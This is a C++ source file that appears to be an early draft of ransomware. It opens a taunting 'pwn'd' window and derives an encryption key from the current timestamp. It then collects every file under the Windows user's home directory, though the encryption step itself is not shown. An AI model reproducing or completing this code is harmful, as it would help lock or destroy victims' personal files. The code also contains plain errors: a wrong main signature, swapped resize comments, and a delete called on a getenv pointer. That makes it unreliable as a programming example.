#pragma comment(lib, "cryptlib")
#define _CRT_SECURE_NO_WARNINGS
#include "logic.h"
#include "includes.h"
using namespace std;
using namespace CryptoPP;
// g++ --std=c++23 -O2 --static main.cpp -o main.exe
int main(int argc, char** argv[]) {
	const int WIDTH = 800, HEIGHT = 600;
	SDL_Init(SDL_INIT_EVERYTHING);
	SDL_Window* window = SDL_CreateWindow("You just got pwn'd by a gay, a furry, and a hacker UwU", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, WIDTH, HEIGHT, SDL_WINDOW_ALLOW_HIGHDPI);
	char* userprofile = getenv("USERPROFILE");
	std::string usrHome = std::string(userprofile);
	delete userprofile;
	std::string keyStr = logic::getUnixMs();
	if (keyStr.size() < 16) {
		keyStr.resize(16); // Truncate if too big
	}
	if (keyStr.size() > 16) {
		keyStr.resize(16, '0'); // Pads if too small

	}
	SecByteBlock keySbb(reinterpret_cast<const unsigned char*>(keyStr.data()), keyStr.size());
	fs::path path = usrHome.c_str();
	std::vector<fs::path> file_paths;
	logic::collect_files(path, file_paths);
	for (const auto& file_path : file_paths) {
        std::cout << file_path << std::endl;
    }
	return 0; 
}